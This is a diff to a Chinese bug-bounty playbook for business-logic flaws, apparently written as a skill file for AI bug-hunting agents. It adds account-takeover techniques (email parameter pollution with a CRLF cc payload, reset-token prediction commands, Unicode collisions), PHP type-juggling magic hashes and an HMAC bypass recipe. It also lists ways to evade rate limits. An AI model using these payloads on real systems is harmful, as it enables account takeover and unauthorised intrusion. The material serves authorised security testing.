@@ -6,7 +6,7 @@
 - [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)（00-index / 11-business-logic）
 - [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)
 - [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)
-- 权威公开源：OWASP WSTG-BUSL / PortSwigger Web Security Academy（business logic track）/ HackTricks
+- 权威公开源：OWASP WSTG-BUSL / PortSwigger Web Security Academy（business logic track）/ HackTricks / [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)（Account Takeover / Type Juggling / Insecure Randomness 章节）
 
 ---
 
@@ -189,6 +189,49 @@ def queueRequests(target, wordlists):
 | 单 IP 限速（Claude-Red） | 轮换 `X-Forwarded-For` `X-Real-IP` `True-Client-IP` `CF-Connecting-IP` |
 | 验证码图形 | 调验证码识别 API（仅自测合规情况下） |
 | IP 限速 + HTTP/2 | 单连接多路复用并发绕过连接数限制 `[本地 src-hunter 11-business-logic.md]` |
+
+### 4.7 账号接管（ATO）扩展手法 `[PayloadsAllTheThings Account Takeover 章节]`
+
+补 §4.1 密码重置 4 模式之外的 ATO 面（全部只用自己的两个测试账号验证）：
+
+| # | 手法 | 操作 |
+|---|---|---|
+| 1 | **重置 token 泄露在 Referer** | 请求重置 → 点开邮件链接**不改密** → 页面上点任意外链 → 抓包看 Referer 是否带 token |
+| 2 | **email 参数污染** | `email=victim@mail.com&email=hacker@mail.com`；`{"email":["victim@mail.com","hacker@mail.com"]}`；`email=victim@mail.com%0A%0Dcc:hacker@mail.com`（CRLF 加抄送）；分隔符变体 `,` `%20` `\|` |
+| 3 | **token 回显在响应** | 触发重置后检查响应体/头里的 `resetToken`，直接拿去拼 `/password/reset?resetToken=...&email=...` |
+| 4 | **用户名碰撞**（CVE-2020-7245，CTFd 实例） | 注册 `"admin "`（带尾随空格）的同名账号 → 请求重置 → 用发给自己的 token 改掉 `admin` 的密码 |
+| 5 | **Unicode 归一化 ATO** | 受害者 `demo@gmail.com`，注册 `demⓞ@gmail.com`；大小写映射/归一化时两账号被等同。用 [unisub](https://github.com/tomnomnom/hacks/tree/master/unisub) / [Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) 找可转换同形字符 |
+| 6 | **经其他漏洞链 ATO** | XSS 偷 session cookie（子域 Cookie 打父域）/ HTTP 走私改写受害者请求 / CSRF 改邮箱 / JWT 换 userID——各自回对应 playbook，ATO 是影响升级话术 |
+
+**重置 token 可预测性工具**（配合 §4.1「重置令牌弱随机」）`[PayloadsAllTheThings Insecure Randomness]`：
+
+- **UUID v1 含时间+MAC**：`guidtool -i <uuid>` 直接读出时间戳与 MAC——token 用 UUIDv1 = 可预测，`guidtool <uuid> -t '2021-11-17 18:03:17' -p 10000` 可按时间窗枚举碰撞
+- **时间种子**：RNG 用 `int(time.time())` 做种 → 已知触发时刻即可本地重放生成同序列
+- **Mongo ObjectId**：内嵌时间戳，多 token 对比推生成频率与规律
+- 判断标准：token 形态（纯数字/<6 位短串/timestamp 拼接/md5(可预测字段)）→ 对应预测路径；强随机（≥128bit 无规律）则此项 N/A
+
+### 4.8 PHP 弱类型比较（Type Juggling）`[PayloadsAllTheThings Type Juggling 章节]`
+
+PHP `==` 松散比较下攻击者可控一侧可碰撞出 true（PHP 8 已修大多数，老系统仍高频）：
+
+```php
+'123a' == 123      'abc' == 0      '' == 0 == false == NULL
+'0x1234Ab' == '1193131'          // 仅 PHP 5
+var_dump(sha1([]));  // NULL —— md5([]) 同理，数组传入哈希函数返回 NULL
+```
+
+**魔法哈希**（`0e` 开头全数字 = 科学计数法 0，两串任意"0e"哈希相等）`[PayloadsAllTheThings，逐字摘录]`：
+
+| 哈希 | 魔法输入 | 魔法哈希 |
+|---|---|---|
+| MD5 | `240610708` | `0e462097431906509019562988736854` |
+| MD5 | `QNKCDZO` | `0e830400451993494058024219903391` |
+| SHA1 | `10932435112` | `0e07766915004133176347055865026311692244` |
+| SHA-256 | `34250003024812` | `0e46289032038065916139621039085883773413820991920706299695051332` |
+
+利用套路（目标：`if ($cookie['hmac'] != $hash)` 松散比较）：`$hmac` 填 `"0"`，爆破 `$expiration` 时间戳直到 `hash_hmac` 输出 `0e` 全数字（示例：`1539805986 → 0e772967136366835494939987377058`）`[PayloadsAllTheThings]`。
+
+**测试入口**：登录/校验接口报错含 PHP；密码/哈希比较处送 `"0"`、数组、`0e` 串看是否放行。
 
 ## 5. 工具用法
 
